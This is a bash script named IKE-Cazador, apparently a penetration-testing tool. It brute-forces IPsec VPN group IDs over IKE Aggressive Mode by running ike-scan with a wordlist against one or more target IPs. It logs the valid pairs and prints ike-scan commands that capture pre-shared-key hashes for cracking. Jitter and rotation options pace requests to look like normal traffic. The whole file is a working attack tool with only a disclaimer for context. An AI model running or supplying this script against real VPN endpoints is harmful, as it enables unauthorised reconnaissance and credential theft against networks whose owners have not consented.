#!/bin/bash

# ╔══════════════════════════════════════════════╗
# ║         IKE-Cazador                          ║
# ║         Group-ID Brute-Force Script          ║
# ║         local-gh0st                          ║
# ║                                              ║
# ║  License/Disclaimer:                         ║
# ║  This script is for educational and/or       ║
# ║  ethical use only.                           ║
# ║                                              ║
# ║  Do not redistribute for monetary gain.      ║
# ║  Do not use for malicious purposes or        ║
# ║  against networks for which you do not have  ║ 
# ║  authorization to test.                      ║
# ║                                              ║
# ║  Unauthorized use is prohibited.             ║
# ╚══════════════════════════════════════════════╝

# === Configuration ===
WORDLIST="$2"
DELAY=0.2
LOGFILE="valid-groupids.log"

# === Colors ===
GREEN='\033[0;32m'
RED='\033[0;31m'
YELLOW='\033[0;33m'
SOFT_YELLOW='\033[0;33m'
BLUE='\033[1;34m'
NC='\033[0m'
VALID_PAIRS=()

# === Optional flags ===
USE_JITTER=false
USE_ROTATION=false
SHOW_DEBUG=false
if [[ "$@" =~ "-debug" ]]; then
    SHOW_DEBUG=true
fi

if [[ "$@" =~ "-j" ]]; then
    USE_JITTER=true
    echo -e "${GREEN}[*] Jitter enabled: random delay between 0.3s–0.99s per request${NC}"
fi

if [[ "$@" =~ "-r" ]]; then
    USE_ROTATION=true
    echo -e "${GREEN}[*] \"Group-first\" rotation enabled (-r flag detected)${NC}"
fi

if [[ "$@" =~ "-debug" ]]; then
    SHOW_DEBUG=true
fi

if [[ "$@" =~ "-h" ]] || [[ "$@" =~ "-help" ]]; then
    echo -e "${YELLOW}Usage: ./IKE-Cazador.sh <target_ip OR targets_list.txt> <groupid_wordlist.txt>${NC}"
    echo ""
    echo -e "${YELLOW}[-r] = Use \"Group-first\" rotation to slow the requests per second against multiple targets${NC}"
    echo -e "${YELLOW}[-j] = Add a \"delay\" of .3-.99 seconds per attempt, should emulate more realistic user behavior${NC}"
    exit 0
fi

# === Check arguments ===
if [ -z "$1" ] || [ -z "$WORDLIST" ]; then
    echo -e "${YELLOW}Usage: ./IKE-Cazador.sh <target_ip OR targets_list.txt> <groupid_wordlist.txt>${NC}"
    echo ""
    echo -e "${YELLOW}[-r] = Use \"Group-first\" rotation to slow the requests per second against multiple targets${NC}"
    echo -e "${YELLOW}[-j] = Add a \"delay\" of .3-.99 seconds per attempt, should emulate more realistic user behavior${NC}"
    exit 1
fi

# === Validate wordlist ===
if [ ! -f "$WORDLIST" ]; then
    echo -e "${RED}[!] Wordlist not found: $WORDLIST${NC}"
    exit 1
fi

# === Load target(s) ===
TARGETS=()
if [[ -f "$1" ]]; then
    echo -e "${GREEN}[*] Loading targets from file: $1${NC}"
    while IFS= read -r line || [[ -n "$line" ]]; do
        # Skip blank lines and lines starting with #
        [[ -z "$line" ]] && continue
        [[ "${line:0:1}" == "#" ]] && continue
        TARGETS+=("$line")
    done < "$1"
else
    TARGETS+=("$1")
fi

echo -e "${GREEN}[*] Loaded ${#TARGETS[@]} target(s)${NC}"
echo -e "${GREEN}[*] Using wordlist: $WORDLIST${NC}"
echo -e "${GREEN}[*] Logging valid results to: $LOGFILE${NC}"
echo ""

# === Read group IDs into an array once ===
mapfile -t GROUP_IDS < "$WORDLIST"

# === Main brute force loop ===
if [ "$USE_ROTATION" = true ]; then
    # === Group-first rotation ===
    for GROUPID in "${GROUP_IDS[@]}"; do
        echo -e "${YELLOW}=== Testing Group ID: $GROUPID ===${NC}"

        for TARGET in "${TARGETS[@]}"; do
            echo -ne "${YELLOW}[~] Testing $GROUPID on $TARGET... ${NC}"

            OUTPUT=$(timeout 5s sudo ike-scan -A -M --id="$GROUPID" "$TARGET" 2>/dev/null)

            if echo "$OUTPUT" | grep -q "Aggressive Mode Handshake returned"; then
                echo -e "${GREEN}[VALID]${NC}"
                echo "$TARGET : $GROUPID" >> "$LOGFILE"
                VALID_PAIRS+=("$TARGET $GROUPID")
                echo -e "${GREEN}[!] Stopping further tests for $TARGET due to success.${NC}"
                break  # Stop testing this TARGET after success
            else
                echo -e "${RED}[INVALID]${NC}"
            fi

            # No sleep/delay here when -r is used
        done

        echo ""
    done
else
    # === Default host-first rotation ===
    for TARGET in "${TARGETS[@]}"; do
        echo -e "${YELLOW}--- Scanning target: $TARGET ---${NC}"

        for GROUPID in "${GROUP_IDS[@]}"; do
            echo -ne "${YELLOW}[~] Testing group ID: $GROUPID${NC}... "

            OUTPUT=$(timeout 5s sudo ike-scan -A -M --id="$GROUPID" "$TARGET" 2>/dev/null)

            if echo "$OUTPUT" | grep -q "Aggressive Mode Handshake returned"; then
                echo -e "${GREEN}[VALID]${NC}"
                echo "$TARGET : $GROUPID" >> "$LOGFILE"
                VALID_PAIRS+=("$TARGET $GROUPID")
                echo -e "${GREEN}[!] Stopping further tests for $TARGET due to success.${NC}"
                break  # Stop testing this TARGET after success
            else
                echo -e "${RED}[INVALID]${NC}"
            fi

            if [ "$USE_JITTER" = true ]; then
                RANDOM_DELAY=$(awk -v min=0.3 -v max=0.99 'BEGIN{srand(); print min+rand()*(max-min)}')
                sleep "$RANDOM_DELAY"
            else
                sleep "$DELAY"
            fi
        done

        echo ""
    done
fi

echo -e "${GREEN}[+] Scan complete. Results saved to ${LOGFILE}.${NC}"

if [ "${#VALID_PAIRS[@]}" -gt 0 ]; then
    echo -e "${SOFT_YELLOW}\n[${#VALID_PAIRS[@]}] Valid pairs found${NC}"
    for pair in "${VALID_PAIRS[@]}"; do
        TARGET=$(echo "$pair" | awk '{print $1}')
        GROUPID=$(echo "$pair" | awk '{print $2}')
        echo -e "${GREEN}$TARGET : $GROUPID${NC}"
    done

    echo -e "${SOFT_YELLOW}\n[+] To capture the hash for each valid target/group ID, run ike-scan.${NC}"
    echo -e "${SOFT_YELLOW}1. Run command${NC}"
    echo -e "${SOFT_YELLOW}2. ????${NC}"
    echo -e "${SOFT_YELLOW}3. Profit${NC}"
    echo ""
    echo -e "${SOFT_YELLOW}run:${NC}"
    for pair in "${VALID_PAIRS[@]}"; do
        TARGET=$(echo "$pair" | awk '{print $1}')
        GROUPID=$(echo "$pair" | awk '{print $2}')
        echo -e "${BLUE}ike-scan -A -M -P --id=$GROUPID $TARGET${NC}"
    done
else
    echo -e "${SOFT_YELLOW}\n${RED}[0]${SOFT_YELLOW} Valid results found for Group ID. Consider mutating your wordlist or using a custom, curated list based off of the organization name, industry, or region.${NC}"
fi

if [ "$SHOW_DEBUG" = true ]; then
    echo "DEBUG: \$1 = '$1'"
    echo "DEBUG: \$2 = '$2'"
    echo "DEBUG: WORDLIST = '$WORDLIST'"
    echo "DEBUG: TARGETS = '${TARGETS[@]}'"
fi
